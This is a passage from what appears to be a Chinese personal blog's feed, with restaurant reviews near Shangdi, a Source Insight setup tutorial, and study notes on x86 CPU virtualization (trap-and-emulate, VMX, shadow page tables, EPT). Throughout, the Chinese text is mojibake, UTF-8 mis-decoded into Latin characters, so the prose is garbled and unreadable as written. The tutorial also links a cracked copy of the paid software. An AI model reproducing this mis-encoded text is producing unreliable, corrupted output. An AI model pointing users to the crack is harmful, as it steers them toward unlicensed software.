title="å˜‰å’Œä¸€å“ç²¥"></a>å˜‰å’Œä¸€å“ç²¥</h1><blockquote><p>ä½äºä¸Šåœ°åŒ—ã€å†œå¤§è¥¿</p></blockquote><h1 id="å¤´ä¸€å·"><a href="#å¤´ä¸€å·" class="headerlink" title="å¤´ä¸€å·"></a>å¤´ä¸€å·</h1><blockquote><p>åˆ†åº—ä¼—å¤šï¼Œæœ€è¿‘çš„ä¸€å®¶åœ¨ä¸Šåœ°åŒ»é™¢ä¸œ</p></blockquote><h1 id="éœ¸è›®ç±³çº¿"><a href="#éœ¸è›®ç±³çº¿" class="headerlink" title="éœ¸è›®ç±³çº¿"></a>éœ¸è›®ç±³çº¿</h1><blockquote><p>ä½äºä¸Šåœ°è´Ÿä¸€å±‚</p></blockquote><p>æ— é™ç»­ç²‰ï¼Œæœ€é«˜è®°å½•åƒäº†äº”ä»½ã€‚psï¼šè¿™ä¸ªè¾£æ¤’æ˜¯çœŸçš„æŒºè¾£çš„</p><p><img src="https://img.gls.show/img/202311192040639.png"></p><p><img src="https://img.gls.show/img/202311192028404.png"></p><h1 id="ä¸œæ¥é¡º"><a href="#ä¸œæ¥é¡º" class="headerlink" title="ä¸œæ¥é¡º"></a>ä¸œæ¥é¡º</h1><blockquote><p>ä½äºä¸Šåœ°å•†åœº</p></blockquote><p>äººå‡100ï¼Œå£å‘³ä¸€èˆ¬ï¼Œçº¯çº¯çš„è¾£é¸¡ï¼Œè¿œè¿œæ¯”ä¸ä¸Šæµ·åº•æã€‚</p><h1 id="ç«é”…é¸¡"><a href="#ç«é”…é¸¡" class="headerlink" title="ç«é”…é¸¡"></a>ç«é”…é¸¡</h1><blockquote><p>åˆ†åº—ä¼—å¤šï¼Œæ€»åº—åœ¨æ€€æŸ”</p></blockquote><p>äººå‡70+ï¼Œyydsï¼Œå¥½åƒä¸è´µï¼Œæ€€æŸ”ä¸€ç»ã€‚å°±æ˜¯å¤ªå¥½åƒäº†éœ€è¦æ’é˜Ÿ</p><h1 id="äº‘æµ·è‚´"><a href="#äº‘æµ·è‚´" class="headerlink" title="äº‘æµ·è‚´"></a>äº‘æµ·è‚´</h1><p>ä½äºæ¸…æ²³ä¸‡è±¡æ±‡ï¼Œäººå‡110+</p><p>è¿˜æ²¡åƒè¿‡æ–¤ä»·108çš„é±¼ï¼Œé”…åº•è¿˜è¦å¦ç®—é’±ï¼Œçº¯çº¯è¢«å®°äº†ï¼š(</p><p><img src="https://img.gls.show/img/202311192115968.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>source insight â€”â€”æºç çš„æœ€ä½³é˜…è¯»å™¨</title>
    <link href="/p/6b8fde0c/"/>
    <url>/p/6b8fde0c/</url>
    
    <content type="html"><![CDATA[<h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><ul><li>åœ¨æ­¤å¤„ä¸‹è½½ï¼š<a href="https://www.sourceinsight.com/download/">Downloads - Source Insight</a></li><li>siæ­£ç‰ˆæ˜¯æ”¶è´¹çš„ï¼Œå¦‚æœè§‰å¾—è´µå¯ä»¥è€ƒè™‘githubä¸Šä¸€ä¸ªç ´è§£çš„é¡¹ç›®ï¼š<a href="https://github.com/achilsh/source_insight_4">GitHub - achilsh/source_insight_4: å‚è€ƒç½‘ä¸Šä½¿ç”¨</a></li></ul><h1 id="é…ç½®é¡¹ç›®"><a href="#é…ç½®é¡¹ç›®" class="headerlink" title="é…ç½®é¡¹ç›®"></a>é…ç½®é¡¹ç›®</h1><p>è¿™æ˜¯ä¸»ç•Œé¢</p><p><img src="https://img.gls.show/img/20230815173930.png"></p><p>å¯¹äºæ¯ä¸€ä¸ªæºç æ–‡ä»¶å¤¹ï¼Œæˆ‘ä»¬éƒ½è¦å»ºç«‹ä¸€ä¸ªé¡¹ç›®ï¼ˆprojectï¼‰</p><p>èœå•-ã€‹project-ã€‹new projectæˆ–è€…alt+shift+Nå¿«æ·é”®å¯ä»¥æ–°å»ºé¡¹ç›®</p><p><img src="https://img.gls.show/img/20230815174144.png"></p><p>å¡«å†™é¡¹ç›®åç§°ï¼Œä»¥åŠsource insighté¡¹ç›®æ–‡ä»¶å­˜å‚¨ä½ç½®ï¼Œè¿™é‡Œæ¨èå°†<strong>é¡¹ç›®æ–‡ä»¶å­˜å‚¨ä½ç½®æ”¾åœ¨ä½ çš„æºç çš„æ–‡ä»¶å¤¹çš„æ ¹ç›®å½•</strong>ï¼ˆåé¢ä¼šè®²è¿°åŸå› ï¼‰</p><p><img src="https://img.gls.show/img/20230815174248.png"></p><p>ä¸€è·¯OKï¼Œåˆ°è¾¾è¿™ä¸ªç•Œé¢</p><p><img src="https://img.gls.show/img/20230815174556.png"></p><p>é€‰ä¸­æºç æ–‡ä»¶å¤¹ï¼Œç›´æ¥add allï¼Œé€‰ä¸­é€’å½’åŠ å…¥æ–‡ä»¶å¤¹ä¸­æ–‡ä»¶</p><p>ç„¶åcloseå³å¯ã€‚è‡³æ­¤ï¼Œé¡¹ç›®å·²ç»åˆ›å»ºå®Œæˆ</p><p>ä½†æ˜¯ç›®å‰ä¸ºæ­¢ï¼Œè¿˜æ²¡æœ‰åˆ›å»ºé¡¹ç›®ä¸­ä»£ç çš„ç¬¦å·ç´¢å¼•ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨syncä¸€ä¸‹ï¼Œå¿«æ·é”®æ˜¯alt+shift+s</p><p><img src="https://img.gls.show/img/20230815174814.png"></p><p>ç‚¹å‡»startï¼ŒåŒæ­¥è¿‡ç¨‹æˆ–è®¸æœ‰äº›æ…¢ï¼ˆç”±æºç å¤§å°å†³å®šï¼‰</p><h1 id="é…ç½®ç›¸å¯¹è·¯å¾„"><a href="#é…ç½®ç›¸å¯¹è·¯å¾„" class="headerlink" title="é…ç½®ç›¸å¯¹è·¯å¾„"></a>é…ç½®ç›¸å¯¹è·¯å¾„</h1><p>ç½‘ä¸Šç›¸å…³æ•™ç¨‹éƒ½æ˜¯ä¹±ä¸ƒå…«ç³Ÿï¼Œå…¶å®å¾ˆç®€å•ï¼Œåªéœ€è¦<strong>å°†é¡¹ç›®æ–‡ä»¶å­˜å‚¨ä½ç½®æ”¾åœ¨ä½ çš„æºç çš„æ–‡ä»¶å¤¹çš„æ ¹ç›®å½•</strong>ï¼Œå³å¯åšåˆ°æ˜¾ç¤ºç›¸å¯¹è·¯å¾„</p><h1 id="siå®ç”¨åŠŸèƒ½"><a href="#siå®ç”¨åŠŸèƒ½" class="headerlink" title="siå®ç”¨åŠŸèƒ½"></a>siå®ç”¨åŠŸèƒ½</h1><h2 id="æŸ¥çœ‹å®šä¹‰"><a href="#æŸ¥çœ‹å®šä¹‰" class="headerlink" title="æŸ¥çœ‹å®šä¹‰"></a>æŸ¥çœ‹å®šä¹‰</h2><ul><li><p>æ‰“å¼€context Windowï¼Œå·¦ä¾§ä»£ç çª—å£å¤„ç‚¹å‡»å‡½æ•°åï¼Œå³ä¾§å°†ä¼šå¼¹å‡ºè¯¥å‡½æ•°çš„å®šä¹‰</p></li><li><p>ç›´æ¥å³é”®å‡½æ•°ï¼Œé€‰æ‹©jump to definitionäº¦å¯</p></li><li><p>æŒ‰ä½ctrlé”®ï¼Œç‚¹å‡»å‡½æ•°åäº¦å¯</p></li></ul><p><img src="https://img.gls.show/img/20230818173044.png"></p><h2 id="æŸ¥çœ‹å¼•ç”¨"><a href="#æŸ¥çœ‹å¼•ç”¨" class="headerlink" title="æŸ¥çœ‹å¼•ç”¨"></a>æŸ¥çœ‹å¼•ç”¨</h2><p>æ‰¾åˆ°å‡½æ•°åï¼Œå³é”®jump to referenceï¼ˆåœ¨å¼¹å‡ºçš„çª—å£ä¸­å¯ä»¥é€‰æ‹©æ˜¯æ•´ä¸ªprojectæœç´¢è¿˜æ˜¯å½“å‰æ–‡ä»¶ä¸­æœç´¢ç­‰ç­‰é€‰é¡¹ï¼‰</p><h2 id="æŸ¥çœ‹å‡½æ•°è°ƒç”¨"><a href="#æŸ¥çœ‹å‡½æ•°è°ƒç”¨" class="headerlink" title="æŸ¥çœ‹å‡½æ•°è°ƒç”¨"></a>æŸ¥çœ‹å‡½æ•°è°ƒç”¨</h2><p>æ‰¾åˆ°å‡½æ•°åï¼Œå³é”®jump to callerå³å¯</p><h2 id="ç”Ÿæˆå‡½æ•°è°ƒç”¨å›¾"><a href="#ç”Ÿæˆå‡½æ•°è°ƒç”¨å›¾" class="headerlink" title="ç”Ÿæˆå‡½æ•°è°ƒç”¨å›¾"></a>ç”Ÿæˆå‡½æ•°è°ƒç”¨å›¾</h2><p>åœ¨relationçš„çª—å£çš„è®¾ç½®ä¸­ï¼Œå°†functionçš„relationæ”¹ä¸ºcalls and callersï¼ˆé»˜è®¤æ˜¯referrenceï¼‰ï¼Œä¹‹åå°±å¯ä»¥å¾—åˆ°å‡½æ•°è°ƒç”¨å›¾äº†</p><p>å¯¹äºexpansion levelçš„å€¼çš„è®¾ç½®ï¼Œå»ºè®®æ˜¯2ï¼Œå¤ªå¤§äº†çš„è¯æ¯ä¸€æ¬¡æ„å»ºç´¢å¼•ä¼šå¾ˆæ…¢ï¼Œè€Œ1åˆå¤ªå°äº†</p><p><img src="https://img.gls.show/img/20230818174710.png"></p><p>ç„¶åè®°å¾—åœ¨call graph filtering ä¸­æŠŠmacroå»æ‰ï¼Œé‚£ä¸ªæ²¡ä»€ä¹ˆå¿…è¦</p><p><img src="https://img.gls.show/img/20230818175636.png"></p><h2 id="ä¿®æ”¹ä¸»é¢˜"><a href="#ä¿®æ”¹ä¸»é¢˜" class="headerlink" title="ä¿®æ”¹ä¸»é¢˜"></a>ä¿®æ”¹ä¸»é¢˜</h2><p>ç½‘ä¸Šæœ‰è®¸å¤šä¸»é¢˜ï¼Œå®ƒä»¬çš„æœ¬è´¨æ˜¯xmlé…ç½®æ–‡ä»¶ã€‚èœå•-ã€‹option-ã€‹load configurationå¯ä»¥å¯¼å…¥é¢„è®¾çš„ä¸»é¢˜ç•Œé¢ï¼Œæ¨èä¸€ä¸ªé»‘è‰²æ¨¡å¼çš„ä¸»é¢˜ï¼š<a href="https://github.com/Jay11212/vs_code_theme_for_source">ä»¿vs code ä¸»é¢˜ </a></p><p><img src="https://img.gls.show/img/20230818170640.png"></p><p>é™¤æ­¤ä¹‹å¤–ï¼Œsiè¿˜æœ‰è®¸å¤šè‡ªå¸¦çš„ä¸»é¢˜ï¼Œç‚¹å‡»èœå•-ã€‹option-ã€‹visual themeå³å¯é€‰æ‹©</p><h2 id="ä¿®æ”¹å‡½æ•°åå¤§å°å’Œé¢œè‰²"><a href="#ä¿®æ”¹å‡½æ•°åå¤§å°å’Œé¢œè‰²" class="headerlink" title="ä¿®æ”¹å‡½æ•°åå¤§å°å’Œé¢œè‰²"></a>ä¿®æ”¹å‡½æ•°åå¤§å°å’Œé¢œè‰²</h2><p>é»˜è®¤è®¾ç½®ä¸‹å‡½æ•°æ˜¯ç»¿è‰²çš„è€Œä¸”æ¯”è¾ƒå°ï¼Œæˆ‘ä¹ æƒ¯æ”¹æˆå¤§ä¸”é†’ç›®çš„é¢œè‰²</p><p><img src="https://img.gls.show/img/20230818180441.png"></p><h1 id="é…ç½®sié˜…è¯»linuxå†…æ ¸æºç "><a href="#é…ç½®sié˜…è¯»linuxå†…æ ¸æºç " class="headerlink" title="é…ç½®sié˜…è¯»linuxå†…æ ¸æºç "></a>é…ç½®sié˜…è¯»linuxå†…æ ¸æºç </h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šæ·±åº¦æ¢ç´¢Linuxç³»ç»Ÿè™šæ‹ŸåŒ–ã€‹å­¦ä¹ ç¬”è®°</title>
    <link href="/p/c275a99e/"/>
    <url>/p/c275a99e/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ã€CPUè™šæ‹ŸåŒ–"><a href="#ä¸€ã€CPUè™šæ‹ŸåŒ–" class="headerlink" title="ä¸€ã€CPUè™šæ‹ŸåŒ–"></a>ä¸€ã€CPUè™šæ‹ŸåŒ–</h1><h2 id="1-1-x86CPUè™šæ‹ŸåŒ–"><a href="#1-1-x86CPUè™šæ‹ŸåŒ–" class="headerlink" title="1.1 x86CPUè™šæ‹ŸåŒ–"></a>1.1 x86CPUè™šæ‹ŸåŒ–</h2><p>è®ºæ–‡â€œFormal Requirements for Virtualizable Third GenerationArchitecturesâ€ä¸­æå‡ºäº†è™šæ‹ŸåŒ–çš„3ä¸ªæ¡ä»¶ï¼š</p><ul><li><strong>ç­‰ä»·æ€§</strong>ï¼Œå³VMMéœ€è¦åœ¨å®¿ä¸»æœºä¸Šä¸ºè™šæ‹Ÿæœºæ¨¡æ‹Ÿå‡ºä¸€ä¸ªæœ¬è´¨ä¸Š<strong>ä¸ç‰©ç†æœºä¸€è‡´çš„ç¯å¢ƒ</strong></li><li><strong>é«˜æ•ˆæ€§</strong>ï¼Œå³è™šæ‹ŸæœºæŒ‡ä»¤æ‰§è¡Œçš„æ€§èƒ½ä¸å…¶åœ¨ç‰©ç†æœºä¸Šè¿è¡Œç›¸æ¯”å¹¶<strong>æ— æ˜æ˜¾æŸè€—</strong></li><li><strong>èµ„æºæ§åˆ¶</strong>ï¼Œå³<strong>VMMå¯ä»¥å®Œå…¨æ§åˆ¶ç³»ç»Ÿèµ„æº</strong>ã€‚ç”±VMMæ§åˆ¶åè°ƒå®¿ä¸»æœºèµ„æºç»™å„ä¸ªè™šæ‹Ÿæœºï¼Œè€Œä¸èƒ½ç”±è™šæ‹Ÿæœºæ§åˆ¶äº†å®¿ä¸»æœºçš„èµ„æºã€‚</li></ul><h3 id="1-1-1é™·å…¥å’Œæ¨¡æ‹Ÿ"><a href="#1-1-1é™·å…¥å’Œæ¨¡æ‹Ÿ" class="headerlink" title="1.1.1é™·å…¥å’Œæ¨¡æ‹Ÿ"></a>1.1.1é™·å…¥å’Œæ¨¡æ‹Ÿ</h3><p>æ»¡è¶³ä¸Šè¿°è™šæ‹ŸåŒ–çš„ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯<strong>é™·å…¥å’Œæ¨¡æ‹Ÿï¼ˆTrap and Emulateï¼‰æ¨¡å‹</strong></p><blockquote><p>å¤„ç†å™¨åˆ†ä¸ºä¸¤ç§è¿è¡Œæ¨¡å¼ï¼š<strong>ç³»ç»Ÿæ¨¡å¼å’Œç”¨æˆ·æ¨¡å¼</strong><br>CPUçš„æŒ‡ä»¤ä¹Ÿåˆ†ä¸ºï¼š<strong>ç‰¹æƒæŒ‡ä»¤å’Œéç‰¹æƒæŒ‡ä»¤</strong><br>ç‰¹æƒæŒ‡ä»¤åªèƒ½åœ¨ç³»ç»Ÿæ¨¡å¼è¿è¡Œï¼Œå¦‚æœåœ¨ç”¨æˆ·æ¨¡å¼è¿è¡Œå°±å°†è§¦å‘å¤„ç†å™¨å¼‚å¸¸ã€‚å†…æ ¸è¿è¡Œåœ¨ç³»ç»Ÿæ¨¡å¼</p></blockquote><p>åœ¨é™·å…¥å’Œæ¨¡æ‹Ÿæ¨¡å‹ä¸‹ï¼Œè™šæ‹Ÿæœºçš„ç”¨æˆ·ç¨‹åºä»ç„¶è¿è¡Œåœ¨ç”¨æˆ·æ¨¡å¼ï¼Œä½†æ˜¯<strong>è™šæ‹Ÿæœºçš„å†…æ ¸ä¹Ÿå°†è¿è¡Œåœ¨ç”¨æˆ·æ¨¡å¼</strong>ï¼Œè¿™ç§æ–¹å¼ç§°ä¸ºç‰¹æƒçº§å‹ç¼©ï¼ˆRing Compressionï¼‰ã€‚åœ¨è¿™ç§æ–¹å¼ä¸‹ï¼Œè™šæ‹Ÿæœºä¸­çš„<strong>éç‰¹æƒæŒ‡ä»¤ç›´æ¥è¿è¡Œåœ¨å¤„ç†å™¨ä¸Š</strong>ã€‚è¿™æ ·çš„å¥½å¤„å°±æ˜¯é«˜æ•ˆï¼ŒæŒ‡ä»¤æ— éœ€vmmå¹²é¢„å¯ä»¥ç›´æ¥è¿è¡Œåœ¨å¤„ç†å™¨ä¸Š</p><p>å¯¹äº<strong>è™šæ‹Ÿæœºä¸­çš„ç‰¹æƒæŒ‡ä»¤ï¼Œå› ä¸ºæ˜¯åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹è¿è¡Œï¼Œå°†è§¦å‘å¤„ç†å™¨å¼‚å¸¸ï¼Œä»è€Œé™·å…¥VMM</strong>ä¸­ï¼Œç”±VMMä»£ç†è™šæ‹Ÿæœºå®Œæˆç³»ç»Ÿèµ„æºçš„è®¿é—®ï¼Œå³æ‰€è°“çš„æ¨¡æ‹Ÿï¼ˆemulateï¼‰</p><h3 id="1-1-2-x86æ¶æ„è™šæ‹ŸåŒ–çš„éšœç¢"><a href="#1-1-2-x86æ¶æ„è™šæ‹ŸåŒ–çš„éšœç¢" class="headerlink" title="1.1.2 x86æ¶æ„è™šæ‹ŸåŒ–çš„éšœç¢"></a>1.1.2 x86æ¶æ„è™šæ‹ŸåŒ–çš„éšœç¢</h3><p>ä¿®æ”¹ç³»ç»Ÿèµ„æºçš„ï¼Œæˆ–è€…åœ¨ä¸åŒæ¨¡å¼ä¸‹è¡Œä¸ºæœ‰ä¸åŒè¡¨ç°çš„ï¼Œéƒ½å±äº<strong>æ•æ„ŸæŒ‡ä»¤</strong></p><p>åœ¨è™šæ‹ŸåŒ–åœºæ™¯ä¸‹ï¼ŒVMMéœ€è¦ç›‘æµ‹è¿™äº›æ•æ„ŸæŒ‡ä»¤ã€‚<strong>ä¸€ä¸ªæ”¯æŒè™šæ‹ŸåŒ–çš„ä½“ç³»æ¶æ„çš„æ•æ„ŸæŒ‡<br>ä»¤éƒ½åº”è¯¥å±äºç‰¹æƒæŒ‡ä»¤</strong>ï¼Œå³<strong>åœ¨éç‰¹æƒçº§åˆ«æ‰§è¡Œè¿™äº›æ•æ„ŸæŒ‡ä»¤æ—¶CPUä¼šæŠ›å‡ºå¼‚å¸¸</strong>ï¼Œè¿›å…¥VMMçš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œä»è€Œå®ç°äº†æ§åˆ¶VMè®¿é—®æ•æ„Ÿèµ„æºçš„ç›®çš„</p><p><strong>x86æ¶æ„å¹¶ä¸æ˜¯æ‰€æœ‰çš„æ•æ„ŸæŒ‡ä»¤éƒ½æ˜¯ç‰¹æƒæŒ‡ä»¤ï¼Œæœ‰äº›æ•æ„ŸæŒ‡ä»¤åœ¨éç‰¹æƒæ¨¡å¼ä¸‹æ‰§è¡Œæ—¶å¹¶ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ­¤æ—¶VMMå°±æ— æ³•æ‹¦æˆªå¤„ç†VMçš„è¡Œä¸ºäº†</strong></p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä¸ºä»€ä¹ˆæ—¢è¦æœ‰æ•æ„ŸæŒ‡ä»¤ï¼Œåˆè¦æœ‰ç‰¹æƒæŒ‡ä»¤ï¼Œè¿™æ˜¯å‡ºäºä»€ä¹ˆè€ƒè™‘å‘¢ï¼Ÿæˆ–è€…è¯´ç›´æ¥ç®€å•ç²—æš´çš„æŠŠæ‰€æœ‰çš„æ•æ„ŸæŒ‡ä»¤éƒ½å½’ä¸ºç‰¹æƒæŒ‡ä»¤ä¸å°±å¯ä»¥äº†ï¼Ÿ</p><ol><li><strong>æé«˜æ€§èƒ½å’Œæ•ˆç‡ï¼š</strong> æ•æ„ŸæŒ‡ä»¤å…è®¸ä¸€äº›æ•æ„Ÿæ“ä½œåœ¨ç”¨æˆ·æ€ä¸‹æ‰§è¡Œï¼Œä»è€Œæé«˜æ€§èƒ½å’Œæ•ˆç‡ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå°†æ•æ„Ÿæ“ä½œä½œä¸ºæ™®é€šæŒ‡ä»¤æ‰§è¡Œå¯ä»¥å‡å°‘ç‰¹æƒçº§åˆ«çš„åˆ‡æ¢å’Œå¼€é”€ï¼Œæé«˜åº”ç”¨ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚</li><li><strong>çµæ´»æ€§å’Œå¯ç¼–ç¨‹æ€§ï¼š</strong> æ•æ„ŸæŒ‡ä»¤å…è®¸åº”ç”¨ç¨‹åºåœ¨ç”¨æˆ·æ€ä¸‹æ‰§è¡Œä¸€äº›ä½çº§çš„ç¡¬ä»¶æ“ä½œï¼Œä»¥å®ç°æ›´çµæ´»çš„ç¼–ç¨‹å’ŒåŠŸèƒ½ã€‚è¿™å¯ä»¥ä½¿åº”ç”¨ç¨‹åºæ›´åŠ è‡ªç”±åœ°æ§åˆ¶ç¡¬ä»¶ï¼Œå®ç°ä¸€äº›ç‰¹å®šçš„åŠŸèƒ½æˆ–ä¼˜åŒ–ã€‚</li></ol><p>ä»¥ä¿®æ”¹FLAGSå¯„å­˜å™¨ä¸­çš„IFï¼ˆInterrupt Flagï¼‰ä¸ºä¾‹ï¼š</p><ul><li>é¦–å…ˆä½¿ç”¨æŒ‡ä»¤pushfå°†FLAGSå¯„å­˜å™¨çš„å†…å®¹å‹åˆ°æ ˆä¸­</li><li>ç„¶åå°†æ ˆé¡¶çš„IFæ¸…é›¶</li><li>æœ€åä½¿ç”¨popfæŒ‡ä»¤ä»æ ˆä¸­æ¢å¤FLAGSå¯„å­˜å™¨<br>å¦‚æœè™šæ‹Ÿæœºå†…æ ¸æ²¡æœ‰è¿è¡Œåœ¨ring 0ï¼Œx86çš„CPUå¹¶ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œåªæ˜¯å¿½ç•¥æŒ‡ä»¤popf</li></ul><p>è§£å†³æ–¹æ¡ˆï¼šè¯•ç”¨xençš„æ–¹å¼ï¼Œä¿®æ”¹æ“ä½œç³»ç»Ÿæºç ï¼ˆä¹Ÿå³æ˜¯åŠè™šæ‹ŸåŒ–æ–¹å¼ï¼‰ï¼›å¦ä¸€ç§æ˜¯è½¯ä»¶å±‚é¢çš„äºŒè¿›åˆ¶ç¿»è¯‘</p><p>é™æ€ç¿»è¯‘ï¼š</p><ul><li>è¿è¡Œå‰æ‰«ææ•´ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯¹æ•æ„ŸæŒ‡ä»¤è¿›è¡Œç¿»è¯‘ï¼Œå½¢æˆä¸€ä¸ªæ–°çš„æ–‡ä»¶</li><li>ç¼ºç‚¹ï¼šå¿…é¡»æå‰å¤„ç†ï¼Œè€Œä¸”å¯¹äºæœ‰äº›æŒ‡ä»¤åªæœ‰åœ¨è¿è¡Œæ—¶æ‰ä¼šäº§ç”Ÿçš„å‰¯ä½œç”¨ï¼Œæ— æ³•é™æ€å¤„ç†</li></ul><p>åŠ¨æ€ç¿»è¯‘ï¼š</p><ul><li>åœ¨è¿è¡Œæ—¶ä»¥ä»£ç å—ä¸ºå•å…ƒåŠ¨æ€åœ°ä¿®æ”¹äºŒè¿›åˆ¶ä»£ç <ul><li>åœ¨å¾ˆå¤šVMMä¸­å¾—åˆ°åº”ç”¨ï¼Œè€Œä¸”ä¼˜åŒ–çš„æ•ˆæœéå¸¸ä¸é”™</li></ul></li></ul><h3 id="1-1-3vmx"><a href="#1-1-3vmx" class="headerlink" title="1.1.3vmx"></a>1.1.3vmx</h3><blockquote><p>Intelå¼€å‘äº†VTæŠ€æœ¯ä»¥æ”¯æŒè™šæ‹ŸåŒ–ï¼Œä¸ºCPUå¢åŠ äº†Virtual-Machine<br>Extensionsï¼Œç®€ç§°VMX</p></blockquote><p>ç”±äºä¹‹å‰çš„è½¯ä»¶è§£å†³æ–¹æ¡ˆå¼•å…¥äº†å·¨å¤§å¼€é”€å’Œå¤æ‚æ€§ï¼Œäºæ˜¯ï¼ŒIntelå°è¯•ä»ç¡¬ä»¶å±‚é¢è§£å†³è¿™ä¸ªé—®é¢˜ï¼ˆnmè‹±ç‰¹å°”ç»ˆäºä¸‹åœºäº†ï¼‰</p><blockquote><p>æ§åˆ¶å¯„å­˜å™¨ CR3 åœ¨ x86 æ¶æ„ä¸­æ˜¯é¡µç›®å½•è¡¨çš„åŸºåœ°å€ï¼Œç”¨äºç¡®å®šå½“å‰æ­£åœ¨æ‰§è¡Œçš„è™šæ‹Ÿæœºçš„é¡µè¡¨ã€‚</p></blockquote><p>å½“ä½¿ç”¨å½±å­é¡µè¡¨ï¼ˆShadow Page Tableï¼‰è¿›è¡Œè™šæ‹Ÿåœ°å€ï¼ˆGVAï¼‰åˆ°ç‰©ç†åœ°å€ï¼ˆHPAï¼‰çš„æ˜ å°„æ—¶ï¼Œ**è™šæ‹Ÿæœºç›‘æ§å™¨ï¼ˆVMMï¼‰æ¨¡å—éœ€è¦æ•è·è™šæ‹Ÿæœºï¼ˆGuestï¼‰æ¯ä¸€æ¬¡è®¾ç½®æ§åˆ¶å¯„å­˜å™¨ CR3 çš„æ“ä½œï¼Œå¹¶å°†å®ƒé‡å®šå‘åˆ°å½±å­é¡µè¡¨ã€‚CR3 å¯„å­˜å™¨æ˜¯x86ä½“ç³»ç»“æ„ä¸­çš„æ§åˆ¶å¯„å­˜å™¨ï¼Œç”¨äºæŒ‡å‘é¡µè¡¨çš„ç‰©ç†åœ°å€ã€‚</p><blockquote><p>GVAï¼ˆGuest Virtual Addressï¼Œå®¢æˆ·è™šæ‹Ÿåœ°å€ï¼‰å’Œ HPAï¼ˆHost Physical Addressï¼Œå®¿ä¸»ç‰©ç†åœ°å€ï¼‰ä¹‹é—´çš„æ˜ å°„æ˜¯æŒ‡å°†è™šæ‹Ÿæœºä¸­çš„å†…å­˜åœ°å€æ˜ å°„åˆ°åº•å±‚ç‰©ç†ä¸»æœºä¸Šçš„å†…å­˜åœ°å€</p></blockquote><p>é€šè¿‡æ•è·å¹¶é‡å®šå‘CR3å¯„å­˜å™¨çš„è®¾ç½®æ“ä½œï¼ŒVMMèƒ½å¤Ÿæˆªè·Guestçš„é¡µè¡¨è®¿é—®å¹¶æ›´æ”¹å…¶æ˜ å°„æ–¹å¼ã€‚<strong>VMMä¼šåˆ›å»ºå’Œç»´æŠ¤ä¸€ä¸ªä¸Guesté¡µè¡¨ç±»ä¼¼çš„å½±å­é¡µè¡¨ï¼Œå…¶ä¸­åŒ…å«ä¸çœŸå®ç‰©ç†é¡µè¡¨ç›¸å¯¹åº”çš„å½±å­é¡µè¡¨é¡¹</strong>ã€‚VMMä½¿ç”¨å½±å­é¡µè¡¨æ¥è¿½è¸ªå’Œç®¡ç†GVAåˆ°HPAçš„æ˜ å°„ï¼Œå¹¶åœ¨å¿…è¦æ—¶è¿›è¡Œè½¬æ¢å’Œä¿®æ”¹ï¼Œä»¥æä¾›è™šæ‹ŸåŒ–ç¯å¢ƒçš„å®‰å…¨éš”ç¦»å’Œç®¡ç†ã€‚</p><blockquote><p><strong>EPTï¼ˆExtended Page Tablesï¼‰ï¼š</strong> EPT æ˜¯ä¸€ç§ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œç”±æ”¯æŒè™šæ‹ŸåŒ–çš„å¤„ç†å™¨æä¾›ã€‚å®ƒå…è®¸è™šæ‹Ÿæœºç›´æ¥åœ¨ç‰©ç†ä¸»æœºä¸Šè¿è¡Œï¼Œè€Œä¸éœ€è¦é¢å¤–çš„è½¬æ¢å±‚ã€‚åœ¨å¯ç”¨ EPT æ”¯æŒåï¼Œ<strong>å¤„ç†å™¨ä¼šç›´æ¥å¤„ç† GVA åˆ° HPA çš„æ˜ å°„ï¼Œç»•è¿‡äº† VMMã€‚è¿™æ„å‘³ç€ <code>CR3</code> å¯„å­˜å™¨ä»ç„¶æŒ‡å‘è™šæ‹Ÿæœºçš„åŸå§‹é¡µè¡¨ï¼Œè€Œæ— éœ€å¼•å…¥å½±å­é¡µè¡¨</strong>ã€‚<br>è€Œå½“å¯ç”¨äº†ç¡¬ä»¶å±‚é¢çš„EPTæ”¯æŒåï¼Œcr3å¯„å­˜å™¨ä¸å†éœ€è¦æŒ‡å‘å½±å­é¡µè¡¨ï¼Œå…¶ä»ç„¶æŒ‡å‘Guestçš„è¿›ç¨‹çš„é¡µè¡¨ã€‚å› æ­¤ï¼ŒVMMæ— é¡»å†æ•æ‰Guestè®¾ç½®cr3å¯„å­˜å™¨çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè™½ç„¶å†™cr3å¯„å­˜å™¨æ˜¯ä¸€ä¸ªç‰¹æƒæ“ä½œï¼Œä½†è¿™ä¸ªæ“ä½œä¸éœ€è¦é™·å…¥VMMã€‚</p></blockquote><p>ä¸€æ—¦å¯åŠ¨äº†CPUçš„VMXæ”¯æŒï¼ŒCPUå°†æä¾›ä¸¤ç§è¿è¡Œæ¨¡å¼ï¼š<strong>VMX Root Modeå’ŒVMX non-Root Mode</strong>ï¼Œæ¯ä¸€ç§æ¨¡å¼éƒ½æ”¯æŒring 0ï½ring 3ã€‚VMMè¿è¡Œåœ¨VMX Root Modeï¼Œé™¤äº†æ”¯æŒVMXå¤–ï¼ŒVMXRoot Modeå’Œæ™®é€šçš„æ¨¡å¼å¹¶æ— æœ¬è´¨åŒºåˆ«ã€‚VMè¿è¡Œåœ¨VMX non-Root Modeï¼ŒGuestæ— é¡»å†é‡‡ç”¨ç‰¹æƒçº§å‹ç¼©æ–¹å¼ï¼ŒGuest kernelå¯ä»¥ç›´æ¥è¿è¡Œåœ¨VMX non-Root Modeçš„ring 0ä¸­<br><img src="https://img.gls.show/img/Pasted%20image%2020230801165150.png"></p><p><img src="https://img.gls.show/img/Pasted%20image%2020230801200334.png"></p><p>VM entryï¼š</p><ul><li>å¤„äºVMX Root 